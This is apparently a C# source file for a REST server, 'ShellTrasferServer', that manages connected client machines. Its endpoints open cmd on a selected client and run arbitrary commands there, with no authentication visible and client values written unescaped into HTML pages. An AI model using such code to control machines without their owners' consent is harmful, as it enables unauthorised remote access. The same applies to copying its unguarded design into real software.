using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Http;
using System.ServiceModel.Web;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace ShellTrasferServer
{
    public class RestService : ActiveShell ,IRestService
    {
        #region REST Implementation

        public Stream RestGetStatus()
        {
            var status = GetStatus();
            status = HtmlPrintColor(status, new Dictionary<Regex, string>
             {
                                {new Regex("True") , "#00ff00"},
                                {new Regex("False"), "#ff0000"},
                                {new Regex("NickName(.*)"), "Blue"},
                                {new Regex("Client|number(.*)" ), "#ffcc66"}
                            });
            var responceSite = string.Format("<html><body bgcolor=\"Black\" text=\"White\"> {0} </body></html>", status);
            byte[] resultBytes = Encoding.UTF8.GetBytes(responceSite);
            WebOperationContext.Current.OutgoingResponse.ContentType = "text/html";
            return new MemoryStream(resultBytes);
        }

        public Stream RestSelectClient(string id)
        {
            return ReturnPage(SelectClient(id),
                                    string.Format("Fail to select client {0}, <BR>try using Status command to check the client status", id),
                                    string.Format("Connected to Client id: {0}", id));
        }

        public Stream ClearAllData()
        {
            return ReturnPage(ClearAllData(string.Empty),
                                    string.Format("Fail to clear all data"),
                                    string.Format("All data cleared"));
        }

        public Stream CloseClient(string id)
        {
            return ReturnPage(ActiveCloseClient(id),
                                   string.Format("Fail to close Client id : {0}", id),
                                   string.Format("Client id : {0} successfully closed", id));
        }

        public Stream DeleteClientTask(string ClientId, string type, string number)
        {
            return ReturnPage(DeleteClientTask(ClientId, !(type.Contains("Download") || type.Contains("Upload")), int.Parse(number)),
                                 string.Format("Fail to delete task for Client id : {0}", ClientId),
                                 string.Format("Client id : {0} task of type {1} and number {2} deleted", ClientId, type, number));
        }

        public Stream SetNickName(string ClientId, string nickName)
        {
            return ReturnPage(ActiveSetNickName(ClientId, nickName),
                                string.Format("Error set nickName for client id: {0}", ClientId),
                                string.Format("Nick Name Updated for client id: {0}", ClientId));
        }

        public Stream Help()
        {
            var helpStr = new StringBuilder();
            helpStr.AppendLine("1. /Status - Gets the curent clients status as the server");
            helpStr.AppendLine("2. /SelectClient {id} - Selects the specified client");
            helpStr.AppendLine("3. /ClearAllData - Delete all the server data");
            helpStr.AppendLine("4. /CloseClient {id} - Delete the client server data and sends close message to the client");
            helpStr.AppendLine("5. /DeleteClientTask {id} {type} {number} - Delete the client id task of type Upload\\Download\\Shell which is {number} in the status task data");
            helpStr.AppendLine("6. /SetNickName {id} {nick} - Adds nick to the specified client");
            helpStr.AppendLine("7. /Run - open cmd at the selected client");
            helpStr.AppendLine("8. /NextCommand {command}- performs the command at the cmd");
            helpStr.AppendLine("");
            helpStr.AppendLine("Notes:");
            helpStr.AppendLine("1. The syntax for the \\ seprator is |||. So in order to type c:\\ just type c:|||");


            var help = HtmlPrintColor(helpStr.ToString(), new Dictionary<Regex, string>
             {
                                {new Regex("[0-9]."), "Blue"},
                                {new Regex("/(.*)"), "Green"},
                                {new Regex("Notes:"), "Red"},

                            });
            var response = new HttpResponseMessage();
            var responceSite = string.Format("<html><body bgcolor=\"Black\" text=\"White\"> {0} </body></html>", help);
            byte[] resultBytes = Encoding.UTF8.GetBytes(responceSite);
            WebOperationContext.Current.OutgoingResponse.ContentType = "text/html";
            return new MemoryStream(resultBytes);
        }

        public Stream Run()
        {
            var response = ActiveClientRun();
            response = response.Replace("\r", "");
            response = Regex.Replace(response, "[<>]", "");
            response = response.Replace("\n", "<BR>");
            return ReturnPage(true,
                                string.Empty,
                                response);
        }

        public Stream NextCommand(string command)
        {
            //No sucsess sending the seperator \ in the string
            command = command.Replace("|||", "\\");
            var response = ActiveNextCommand(command);
            response = Regex.Replace(response, "[<>]", "");
            response = response.Replace("\r", "");
            response = response.Replace("\n", "<BR>");
            return ReturnPage(true,
                                string.Empty,
                                response);

        }

        private Stream ReturnPage(bool success, string errorMessage, string successMessage)
        {
            var responceSite = string.Format("<html><body bgcolor=\"Black\" text=\"White\"> {0} </body></html>", success ? successMessage : errorMessage);
            var resultBytes = Encoding.UTF8.GetBytes(responceSite);
            WebOperationContext.Current.OutgoingResponse.ContentType = "text/html";
            return new MemoryStream(resultBytes);
        }

        private static string HtmlPrintColor(string text, Dictionary<Regex, string> wordsToColor)
        {
            var str = new StringBuilder();
            var replace = text.Replace("\r", "");
            replace = replace.Replace("\t", "         ");
            var withNoNewLine = replace.Split('\n');
            foreach (var line in withNoNewLine)
            {
                var words = line.Split(' ');
                foreach (var firstWord in words)
                {
                    if (wordsToColor.Count(key => key.Key.IsMatch(firstWord)) == 1)
                    {
                        str.AppendFormat("<font color=\"{0}\">{1}</font>", wordsToColor.First(key => key.Key.IsMatch(firstWord)).Value, firstWord);
                    }
                    else
                    {
                        str.Append(firstWord);
                    }
                    str.Append(" ");

                }
                str.Append("<BR>");
            }
            return str.ToString();
        }
        #endregion REST Implementation
    }
}
